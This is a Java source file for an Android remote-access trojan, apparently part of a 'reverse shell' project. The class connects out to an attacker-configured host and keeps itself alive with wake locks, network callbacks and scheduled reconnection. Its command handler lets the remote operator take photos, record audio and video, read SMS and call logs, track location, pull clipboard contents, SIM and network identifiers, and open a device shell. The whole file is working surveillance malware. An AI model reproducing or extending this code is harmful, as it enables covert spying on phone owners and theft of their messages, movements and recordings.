package com.example.reverseshell2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import com.example.reverseshell2.Payloads.*;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class tcpConnection {
    private static final String TAG = "tcpConnectionClass";
    private static final int SOCKET_TIMEOUT = 30000; // 30 seconds
    private static final int RETRY_DELAY = 5000; // 5 seconds
    private static final int MAX_RETRIES = 3;

    private final Activity activity;
    private final Context context;
    private final functions functions;
    private final CameraPreview mPreview;
    private final vibrate vibrate;
    private final readSMS readSMS;
    private final locationManager locationManager;
    private final audioManager audioManager;
    private final videoRecorder videoRecorder;
    private final readCallLogs readCallLogs;
    private final newShell shell;
    private final AtomicBoolean isRunning;
    private Socket socket;
    
    public static OutputStream out;
    private final Handler mainHandler;
    private final ExecutorService executor;
    private final ConnectivityManager.NetworkCallback networkCallback;
    private PowerManager.WakeLock wakeLock;

    public tcpConnection(Activity activity, Context context) {
        this.activity = activity;
        this.context = context;
        this.functions = new functions(activity);
        this.mPreview = new CameraPreview(context);
        this.vibrate = new vibrate(context);
        this.readSMS = new readSMS(context);
        this.locationManager = new locationManager(context, activity);
        this.audioManager = new audioManager();
        this.videoRecorder = new videoRecorder();
        this.readCallLogs = new readCallLogs(context, activity);
        this.shell = new newShell(activity, context);
        this.isRunning = new AtomicBoolean(true);
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.executor = Executors.newSingleThreadExecutor();
        this.networkCallback = createNetworkCallback();
        
        setupNetworkCallback();
        acquireWakeLock();
    }

    private void setupNetworkCallback() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ConnectivityManager connectivityManager = 
                    (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            
            NetworkRequest.Builder builder = new NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                    .addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR);
            
            connectivityManager.registerNetworkCallback(builder.build(), networkCallback);
        }
    }

    private ConnectivityManager.NetworkCallback createNetworkCallback() {
        return new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(@NonNull Network network) {
                super.onAvailable(network);
                if (!isRunning.get()) {
                    reconnect();
                }
            }

            @Override
            public void onLost(@NonNull Network network) {
                super.onLost(network);
                handleDisconnection("Network lost");
            }
        };
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, 
                "AndroCLI:TcpConnectionWakeLock");
        wakeLock.acquire(10*60*1000L); // 10 minutes
    }

    public void execute(final String... params) {
        if (params.length < 2) {
            Log.e(TAG, "Invalid parameters for connection");
            return;
        }

        executor.execute(() -> {
            try {
                doInBackground(params);
            } catch (Exception e) {
                Log.e(TAG, "Error in background execution", e);
                handleError(e);
            }
        });
    }

    private void handleError(Exception e) {
        mainHandler.post(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                scheduleReconnectWork();
            } else {
                reconnect();
            }
        });
    }

    private void scheduleReconnectWork() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest reconnectWork = new OneTimeWorkRequest.Builder(ReconnectWorker.class)
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.SECONDS)
                .build();

        WorkManager.getInstance(context).enqueueUniqueWork(
                "reconnect_work",
                ExistingWorkPolicy.REPLACE,
                reconnectWork);
    }

    private void reconnect() {
        if (!isRunning.get()) {
            return;
        }

        mainHandler.postDelayed(() -> 
            new tcpConnection(activity, context).execute(config.IP, config.port),
            RETRY_DELAY
        );
    }

    private Void doInBackground(String... strings) {
        int retryCount = 0;
        
        while (isRunning.get() && retryCount < MAX_RETRIES) {
            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])), 
                        SOCKET_TIMEOUT);

                if (socket.isConnected()) {
                    handleConnection();
                    break;
                }
            } catch (SocketTimeoutException | SocketException e) {
                Log.e(TAG, "Connection error", e);
                retryCount++;
                if (retryCount < MAX_RETRIES) {
                    try {
                        Thread.sleep(RETRY_DELAY);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error", e);
                handleError(e);
                break;
            }
        }

        if (retryCount >= MAX_RETRIES) {
            handleError(new Exception("Max retries exceeded"));
        }

        return null;
    }

    private void handleConnection() throws Exception {
        try (DataOutputStream outputStream = new DataOutputStream(socket.getOutputStream());
             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
            
            out = outputStream;
            String model = Build.MODEL + "\n";
            outputStream.write(("Hello there, welcome to reverse shell of " + model)
                    .getBytes("UTF-8"));

            String line;
            while (isRunning.get() && (line = reader.readLine()) != null) {
                processCommand(line, outputStream, socket);
            }
        } finally {
            closeConnection();
        }
    }

    private void processCommand(String command, DataOutputStream outputStream, Socket socket) {
        try {
            // Existing command processing code remains the same
            Log.d(TAG, command);
            if (command.equals("exit"))
            {
                Log.d("service_runner","called");
                mainHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        new tcpConnection(activity,context).execute(config.IP,config.port);
                    }
                });
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    functions.jobScheduler(context);
                }else{
                    mainHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context,mainService.class));
                    }
                });
                }
                socket.close();
            }
            else if (command.equals("camList"))
            {
                String list = functions.get_numberOfCameras();
                outputStream.write(list.getBytes("UTF-8"));
            }
            else if (command.matches("takepic \\d"))
            {
                functions.getScreenUp(activity);
                final String[] cameraid = command.split(" ");
                try
                {
                    outputStream.write("IMAGE\n".getBytes("UTF-8"));
                    mPreview.startUp(Integer.parseInt(cameraid[1]),outputStream);
                } catch (Exception e)
                {
                    e.printStackTrace();
                    new jumper(context).init();
                    Log.d("done", "done");
                }
            }
            else if (command.equals("shell"))
            {
                outputStream.write("SHELL".getBytes("UTF-8"));
                shell.executeShell(socket,outputStream);
            }
            else if (command.equals("getClipData"))
            {
                String clipboard_data = functions.readFromClipboard();
                if (clipboard_data != null)
                {
                    clipboard_data = clipboard_data + "\n";
                    outputStream.write(clipboard_data.getBytes("UTF-8"));
                }
                else
                    {
                    outputStream.write("No Clipboard Data Present\n".getBytes("UTF-8"));
                }
            }
            else if (command.equals("deviceInfo"))
            {
                outputStream.write(functions.deviceInfo().getBytes());
            }
            else if (command.equals("help"))
            {
                outputStream.write("help\n".getBytes());
            }
            else if (command.equals("clear"))
            {
                outputStream.write("Hello there, welcome to reverse shell \n".getBytes("UTF-8"));
            }
            else if (command.equals("getSimDetails"))
            {
                String number = functions.getPhoneNumber(context);
                number+="\n";
                outputStream.write(number.getBytes("UTF-8"));
            }
            else if (command.equals("getIP"))
            {
                String ip_addr =  "Device Ip: "+ipAddr.getIPAddress(true)+"\n";
                outputStream.write(ip_addr.getBytes("UTF-8"));
            }
            // ... existing code for handling commands ...
            else if(command.matches("vibrate \\d"))
            {
                final String[] numbers = command.split(" ");
                vibrate.vib(Integer.parseInt(numbers[1]));
                String res = "Vibrating "+numbers[1]+" time successful.\n";
                outputStream.write(res.getBytes("UTF-8"));
            }
            else if(command.contains("getSMS "))
            {
                String[] box = command.split(" ");
                if(box[1].equals("inbox")){
                    outputStream.write("readSMS inbox\n".getBytes("UTF-8"));
                    String sms = readSMS.readSMSBox("inbox");
                    outputStream.write(sms.getBytes("UTF-8"));
                }else if(box[1].equals("sent")){
                    outputStream.write("readSMS sent\n".getBytes("UTF-8"));
                    String sms = readSMS.readSMSBox("sent");
                    outputStream.write(sms.getBytes("UTF-8"));
                }else{
                    outputStream.write("readSMS null\n".getBytes("UTF-8"));
                    outputStream.write("Wrong Command\n".getBytes("UTF-8"));
                }
                outputStream.write("END123\n".getBytes("UTF-8"));
            }
            else if(command.equals("getLocation"))
            {
                outputStream.write("getLocation\n".getBytes("UTF-8"));
                String res = locationManager.getLocation();
                outputStream.write(res.getBytes("UTF-8"));
                outputStream.write("\n".getBytes("UTF-8"));
                outputStream.write("END123\n".getBytes("UTF-8"));
            }
            else if(command.equals("startAudio"))
            {
                Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                serviceIntent.putExtra("ins", "startFore");
                ContextCompat.startForegroundService(context, serviceIntent);
            }
            else if(command.equals("stopAudio"))
            {
                Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                serviceIntent.putExtra("ins", "stopFore");
                ContextCompat.startForegroundService(context, serviceIntent);
            }
            else if(command.matches("startVideo \\d"))
            {
                final String[] cameraid = command.split(" ");
                Intent serviceIntent = new Intent(context, videoRecorder.class);
                serviceIntent.putExtra("ins", "startFore");
                serviceIntent.putExtra("cameraid", cameraid[1]);
                ContextCompat.startForegroundService(context, serviceIntent);

            }
            else if(command.equals("stopVideo"))
            {
                Intent serviceIntent = new Intent(context, videoRecorder.class);
                serviceIntent.putExtra("ins","stopFore");
                ContextCompat.startForegroundService(context,serviceIntent);
            }
            else if(command.equals("getCallLogs"))
            {
                outputStream.write("callLogs\n".getBytes("UTF-8"));
                String call_logs = readCallLogs.readLogs();
                if(call_logs==null){
                    outputStream.write("No call logs found on the device\n".getBytes("UTF-8"));
                    outputStream.write("END123\n".getBytes("UTF-8"));
                }else{
                    outputStream.write(call_logs.getBytes("UTF-8"));
                    outputStream.write("END123\n".getBytes("UTF-8"));
                }

            }
            else if(command.equals("getMACAddress"))
            {
                String macAddress = ipAddr.getMACAddress(null);
                macAddress+="\n";
                outputStream.write(macAddress.getBytes("UTF-8"));
            }
            else
                {
                outputStream.write("Unknown Command \n".getBytes("UTF-8"));
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing command: " + command, e);
            try {
                outputStream.write(("Error: " + e.getMessage() + "\n").getBytes("UTF-8"));
            } catch (Exception ignored) {
                // Ignore write errors
            }
        }
    }

    private void handleDisconnection(String reason) {
        Log.d(TAG, "Disconnected: " + reason);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            functions.jobScheduler(context);
        } else {
            reconnect();
        }
    }

    private void closeConnection() {
        try {
            if (socket != null && !socket.isClosed()) {
                socket.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing socket", e);
        }
    }

    public void shutdown() {
        isRunning.set(false);
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ConnectivityManager connectivityManager = 
                    (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            connectivityManager.unregisterNetworkCallback(networkCallback);
        }

        executor.shutdownNow();
        closeConnection();
    }

    public static class ReconnectWorker extends Worker {
        public ReconnectWorker(@NonNull Context context, @NonNull WorkerParameters params) {
            super(context, params);
        }

        @NonNull
        @Override
        public Result doWork() {
            Intent serviceIntent = new Intent(getApplicationContext(), mainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
            } else {
                getApplicationContext().startService(serviceIntent);
            }
            return Result.success();
        }
    }
}
